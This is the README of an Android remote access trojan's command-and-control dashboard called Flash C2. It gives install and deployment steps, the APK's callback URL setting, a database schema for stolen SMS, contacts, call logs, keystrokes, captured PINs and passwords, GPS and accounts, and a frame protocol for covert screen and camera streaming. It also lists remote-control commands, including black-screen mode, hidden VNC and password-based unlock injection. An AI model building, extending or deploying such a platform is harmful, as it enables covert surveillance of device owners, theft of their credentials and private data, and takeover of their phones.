# Flash C2 Dashboard

Professional Android RAT management dashboard.  
WebSocket-first, PostgreSQL-backed, Android WebView optimised.

---

## Stack

| Layer | Technology |
|---|---|
| Server | Node.js 18+ · Express · `ws` |
| Database | PostgreSQL 14+ |
| Transport | WebSocket (binary frames + JSON commands) |
| Frontend | Vanilla JS · no build step |

---

## Quick Start

### 1 — Prerequisites

- Node.js ≥ 18
- PostgreSQL 14+

### 2 — Clone & install

```bash
git clone <your-repo> flash-dashboard
cd flash-dashboard
npm install
```

### 3 — Database

```bash
# Create the database
createdb flash

# Apply schema
psql -U postgres -d flash -f schema.sql
```

### 4 — Environment

```bash
cp .env.example .env
# Edit .env — set DATABASE_URL (or PGHOST/PGUSER/PGPASSWORD/PGDATABASE)
```

### 5 — Run

```bash
# Production
npm start

# Development (auto-restart on file change, Node 18+)
npm run dev
```

Server listens on `http://0.0.0.0:3000` by default.  
Open `http://<your-ip>:3000` in any browser (or Android WebView).

---

## WebSocket Endpoints

| Path | Client |
|---|---|
| `/ws/device` | APK (OkHttp) |
| `/` | APK fallback — also routes to device handler |
| `/ws/admin` | Dashboard browser |

---

## APK Configuration

In `NetworkCore.java` (or wherever `SERVER_URL` is defined):

```java
// Plain WebSocket
private static final String SERVER_URL = "ws://YOUR_SERVER_IP:3000";

// TLS (recommended for production)
private static final String SERVER_URL = "wss://YOUR_DOMAIN:3000";
```

The APK connects to the root path `/` — the server accepts this and treats it identically to `/ws/device`.

---

## Database Schema

11 tables — all foreign-keyed to `devices(device_id)` with `ON DELETE CASCADE`.

```
devices          — online/offline state, hardware info, alias
sms              — messages (inbox + sent)
calls            — call log
contacts         — address book
keylog           — keystrokes with app context
passwords        — captured PINs / patterns / passwords (confidence 0-100)
notifications    — notification stream
locations        — GPS history
files            — file manager listings
accounts         — Google / app accounts
command_log      — audit trail of every command sent
```

---

## Binary Frame Protocol

### APK → Server → Admin

```
[0x01][4-byte BE size][JPEG bytes]   — screen frame
[0x02][4-byte BE size][JPEG bytes]   — camera frame
```

The server prepends a device-ID header before forwarding to admin:

```
[2-byte uint16 BE id_length][id_length bytes UTF-8 device_id][original frame]
```

### Admin → Server → APK

JSON text frames:

```json
{ "type": "CLICK",      "x": 540, "y": 960 }
{ "type": "SWIPE",      "x1": 100, "y1": 500, "x2": 100, "y2": 200, "duration": 250 }
{ "type": "LONG_PRESS", "x": 540, "y": 960 }
{ "type": "TYPE",       "text": "hello" }
{ "type": "START_SCREEN" }
{ "type": "STOP_SCREEN" }
{ "type": "BLACK_SCREEN_ON" }
{ "type": "BLACK_SCREEN_OFF" }
{ "type": "BACK" }
{ "type": "HOME" }
{ "type": "RECENTS" }
{ "type": "WAKE_UP" }
{ "type": "send_sms",   "to": "+2348000000000", "body": "hi" }
```

---

## Production Deployment

### Reverse proxy (nginx example)

```nginx
server {
    listen 443 ssl;
    server_name yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    location / {
        proxy_pass         http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host       $host;
        proxy_read_timeout 86400s;
    }
}
```

### systemd service

```ini
[Unit]
Description=Flash C2 Dashboard
After=network.target postgresql.service

[Service]
WorkingDirectory=/opt/flash-dashboard
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=5
EnvironmentFile=/opt/flash-dashboard/.env
User=flash

[Install]
WantedBy=multi-user.target
```

```bash
systemctl enable --now flash
```

---

## Dashboard Features

| Tab | Description |
|---|---|
| **HVNC** | Live screen stream · click · swipe · long-press · black-screen · radar overlay |
| **SMS** | Full inbox/sent view · send SMS |
| **Calls** | Call log with duration |
| **Contacts** | Full address book |
| **Keylog** | Live keystroke feed with app context |
| **Passwords** | Captured PINs/patterns/passwords · 1-tap unlock inject |
| **Notifications** | Notification stream |
| **Location** | GPS history |
| **Info** | Device hardware · permissions · notes · alias |

---

## License

Private — do not distribute.
